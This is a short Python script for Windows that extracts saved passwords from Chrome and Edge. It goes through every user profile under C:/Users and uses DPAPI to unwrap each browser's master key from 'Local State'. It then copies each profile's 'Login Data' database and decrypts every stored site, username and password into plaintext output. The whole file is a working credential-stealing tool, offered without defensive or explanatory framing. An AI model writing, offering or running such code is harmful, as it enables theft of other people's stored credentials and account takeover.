import win32crypt
from base64 import b64decode as d
import sqlite3
from Crypto.Cipher import AES
import os
import shutil

def do_browser(path, user):
    try:
        f = open(path + "Local State").read().split("\"encrypted_key\":\"")
        encrypted_key = d(f[1].split('"')[0])[len("DPAPI"):]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        nonce_length = 96//8

        profiles = [x for x in os.listdir(path) if x[:7] == "Profile"] + ['Default']
        print(profiles)
        for p in profiles:
            try:
                print(f"trying profile {p}...")
                filename = "tmp.db"
                shutil.copyfile(path + f"{p}/Login Data", filename)
                
                conn = sqlite3.connect(filename)
                cursor = conn.cursor()
                results = cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()
            
                for origin_url, username_value, password in results:
                    dec = AES.new(key, AES.MODE_GCM, nonce=password[3:3+nonce_length])
                    print(origin_url, username_value, dec.decrypt(password[3+nonce_length:])[:-16])
                conn.close()
                os.remove(filename)
            except:
                os.remove(filename)
                continue
    
    except Exception as e:
        print(e)  

for user in os.listdir("C:/Users/"):
    if user == "Public": continue
    print(f"{user} Chrome passwords...")
    do_browser(f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/", user)
    print(f"{user} Edge passwords...")
    do_browser(f"C:/Users/{user}/AppData/Local/Microsoft/Edge/User Data/", user)
    
input()
